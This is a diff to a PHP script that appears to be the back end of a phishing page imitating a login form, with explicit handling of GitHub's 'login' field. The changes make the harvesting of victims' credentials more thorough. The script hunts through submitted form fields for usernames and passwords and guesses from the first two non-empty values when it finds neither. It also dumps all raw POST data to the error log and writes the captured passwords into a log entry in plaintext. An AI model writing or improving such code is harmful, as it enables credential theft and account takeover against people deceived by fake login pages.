@@ -430,59 +430,75 @@ $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown
 $username = '';
 $password = '';
 
+// Function to log credentials and debug info
+function logDebug($message) {
+    error_log("[DEBUG] " . $message);
+}
+
+// Log raw POST data
+logDebug("Raw POST data: " . print_r($_POST, true));
+
 // Check for POST data (form submission)
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Output all POST data for debugging
-    error_log("DEBUG - All POST fields: " . print_r($_POST, true));
+    // Dump all POST data to error log for debugging
+    logDebug("All POST fields: " . print_r($_POST, true));
     
-    // Check for GitHub specific fields first
+    // Handle GitHub's login form fields
     if (isset($_POST['login']) && !empty($_POST['login'])) {
         $username = $_POST['login'];
     }
     
-    // If not GitHub, try to capture credentials from common field names
-    if (empty($username)) {
+    // Directly check for 'password' field which is common across most forms
+    if (isset($_POST['password']) && !empty($_POST['password'])) {
+        $password = $_POST['password'];
+        logDebug("Found password field with value length: " . strlen($password));
+    } else {
+        logDebug("No 'password' field found, searching for alternatives");
+    }
+    
+    // If no direct password field, look for alternatives by name pattern
+    if (empty($password)) {
         foreach ($_POST as $key => $value) {
-            // Look for common username/email field names
-            if (stripos($key, 'user') !== false || 
-                stripos($key, 'email') !== false || 
-                stripos($key, 'login') !== false || 
-                stripos($key, 'id') !== false || 
-                stripos($key, 'account') !== false || 
-                stripos($key, 'name') !== false || 
-                stripos($key, 'mail') !== false ||
-                $key === 'username' || 
-                $key === 'email' ||
-                $key === 'login' ||
-                $key === 'loginId') {
+            logDebug("Checking field: $key with value length: " . strlen($value));
+            
+            // Username fields
+            if (empty($username) && 
+                (stripos($key, 'user') !== false || 
+                 stripos($key, 'email') !== false || 
+                 stripos($key, 'login') !== false || 
+                 stripos($key, 'id') !== false || 
+                 stripos($key, 'account') !== false || 
+                 stripos($key, 'name') !== false || 
+                 stripos($key, 'mail') !== false)) {
                 $username = $value;
+                logDebug("Found username in field: $key");
             }
             
-            // Look for common password field names
-            if (stripos($key, 'pass') !== false || 
-                stripos($key, 'pwd') !== false || 
-                stripos($key, 'secret') !== false || 
-                stripos($key, 'pw') !== false ||
-                $key === 'password') {
+            // Password fields
+            if (empty($password) && 
+                (stripos($key, 'pass') !== false || 
+                 stripos($key, 'pwd') !== false || 
+                 stripos($key, 'secret') !== false || 
+                 stripos($key, 'pw') !== false)) {
                 $password = $value;
+                logDebug("Found password in field: $key");
             }
         }
     }
     
-    // If we still didn't find specific fields, log all POST data
-    $all_post_data = '';
-    if (empty($username) && empty($password)) {
-        foreach ($_POST as $key => $value) {
-            $all_post_data .= "$key: $value\n";
-            
-            // Make a best guess about which fields might be username/password
-            if (empty($username) && !empty($value)) {
-                $username = $value; // First non-empty value might be username
-                continue;
-            }
-            if (empty($password) && !empty($value) && $value != $username) {
-                $password = $value; // Second non-empty value might be password
-            }
+    // Last resort: if still no username/password, use the first two non-empty fields
+    if (empty($username) || empty($password)) {
+        logDebug("Using fallback method to find credentials");
+        $values = array_filter(array_values($_POST), function($val) { return !empty($val); });
+        
+        if (count($values) >= 1 && empty($username)) {
+            $username = $values[0];
+            logDebug("Set username from first non-empty value");
+        }
+        
+        if (count($values) >= 2 && empty($password)) {
+            $password = $values[1];
+            logDebug("Set password from second non-empty value");
         }
     }
     
@@ -495,8 +511,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $log_entry .= "Username/Email: $username\n";
     $log_entry .= "Password: $password\n";
     
-    if (!empty($all_post_data)) {
-        $log_entry .= "\nAll POST data:\n$all_post_data";
+    // Log all form fields
+    $log_entry .= "\nAll form fields:\n";
+    foreach ($_POST as $key => $value) {
+        $log_entry .= "$key: $value\n";
     }
     
     $log_entry .= "==================================\n\n";
